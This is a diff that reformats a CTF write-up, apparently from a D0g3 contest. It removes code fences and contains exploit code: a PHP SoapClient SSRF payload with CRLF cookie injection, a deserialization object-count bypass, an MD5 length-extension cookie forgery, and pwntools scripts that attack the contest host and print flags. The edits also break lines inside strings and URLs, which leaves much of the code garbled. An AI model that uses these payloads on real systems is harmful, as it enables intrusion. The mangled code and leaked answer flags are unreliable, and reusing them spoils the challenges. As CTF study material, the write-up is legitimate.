@@ -103,45 +103,21 @@ if($_SERVER["REMOTE_ADDR"]==="63127.0.0.1"){
 }else{
     echo "only localhost!!";
 }
-```
-
-
-
-```
 if (isset($this->a) && $this->a == md5($this->a))
-```
-
-
-
-```
 $ser_str = str_replace('O:1:"A":2', 'O:1:"A":3', $ser_str);
-```
-
-
-
-```
 if (isset($_GET['d0g3'])) {
     ini_set($_GET['baby'], $_GET['d0g3']);
     session_start();
     $_SESSION['sess'] = $_POST['sess'];
 }
-```
-
-
-
-```
 <?php
 $target='http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg';
 $b = new SoapClient(null,array('location' => $target,
-    'user_agent' => "crypt0nrnCookie:PHPSESSID=flag2333rn",
+    'user_agent' => "crypt0nrnCookie:
+PHPSESSID=flag2333rn",
     'uri' => "http://127.0.0.1/"));
 $a = serialize($b);
 echo "|".urlencode($a);
-```
-
-
-
-```
 //exp.php
 <?php
 class A
@@ -181,44 +157,34 @@ echo $ser_str;
 <?php
 $target='http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg';
 $b = new SoapClient(null,array('location' => $target,
-    'user_agent' => "crypt0nrnCookie:PHPSESSID=flag2333rn",
+    'user_agent' => "crypt0nrnCookie:
+PHPSESSID=flag2333rn",
     'uri' => "http://127.0.0.1/"));
 $a = serialize($b);
 echo "|".urlencode($a);
-```
-
-
-
-```
 <!--This secret is 7 characters long for security!
 hash=md5(secret+"flag");//1946714cfa9deb70cc40bab32872f98a
 admin cookie is   md5(secret+urldecode("flag%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%00%00%00%00%00%00%00dog"));
 -->
-```
-
-
-
-```
 POST /index HTTP/1.1
-Host: 47.108.29.107:23333
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:123.0) Gecko/20100101 Firefox/123.0
+Host: 47.108.29.107:
+23333
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:
+123.0) Gecko/20100101 Firefox/123.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 20
-Origin: http://47.108.29.107:23333
+Origin: http://47.108.29.107:
+23333
 Connection: close
-Referer: http://47.108.29.107:23333/
+Referer: http://47.108.29.107:
+23333/
 Cookie: hash=ed63246fb602056fee4a7ec886d0a3c2
 Upgrade-Insecure-Requests: 1
 
 pwd=123&userid=Admin
-```
-
-
-
-```
 var express = require('express');
 var router = express.Router();
 const isObject = obj = >obj && obj.constructor && obj.constructor === Object;
@@ -253,15 +219,13 @@ function(req, res) {
     res.render('info');
 });
 module.exports = router;
-```
-
-
-
-```
 import requests
-url1 = "http://47.108.29.107:23333/infoflllllag"
-url2 = "http://47.108.29.107:23333/Cookie"
-url3 = "http://47.108.29.107:23333/"
+url1 = "http://47.108.29.107:
+23333/infoflllllag"
+url2 = "http://47.108.29.107:
+23333/Cookie"
+url3 = "http://47.108.29.107:
+23333/"
 with open("/1.txt", "a") as file:
    while True:
       talk  = requests.get(url1)
@@ -270,11 +234,6 @@ with open("/1.txt", "a") as file:
       file.write(str(talk.text) + "n")
       file.write(str(talk2.text) + "n")
       file.write(str(talk3.text) + "n")
-```
-
-
-
-```
 def hex_payload(payload):
      res_payload = ''
      for i in payload:
@@ -284,11 +243,6 @@ def hex_payload(payload):
 if __name__ == "__main__":
     payload = input("Input payload: ")
     hex_payload(payload)
-```
-
-
-
-```
 package main
 import (
    "crypto/sha256"
@@ -322,11 +276,6 @@ func main() {
    end := time.Since(start)
    fmt.Println(end)
 }
-```
-
-
-
-```
 from pwn import *
 from hashlib import sha256
 import string
@@ -383,11 +332,6 @@ flag = decrypt(key.encode(),cipher)
 print(flag.replace(b"_",b""))
 io.close()
 # D0g3{o7sIDl8FuWPu01RHZt}
-```
-
-
-
-```
 from pwn import *
 from hashlib import sha256
 import string
@@ -469,11 +413,6 @@ def attack(e1,e2,e3,c1,c2,c3,n):
 io.close()
 
 # D0g3{New_3ra_@f_PK_Crypt0graphy_1976}
-```
-
-
-
-```
 from pwn import *
 r=remote('47.108.29.107',10059)
 payload=b's1mpl3Dec0d4r'
@@ -487,7 +426,7 @@ r.sendlineafter('comment> ',payload)
 最终EXP：
 from pwn import *
 context.binary = "./chall"
-#r=process(["qemu-arm", "-g", "8888", "./chall"])
+    #r=process(["qemu-arm", "-g", "8888", "./chall"])
 r=remote("47.108.29.107",10059)
 elf=ELF('./chall')
 payload='s1mpl3Dec0d4r'
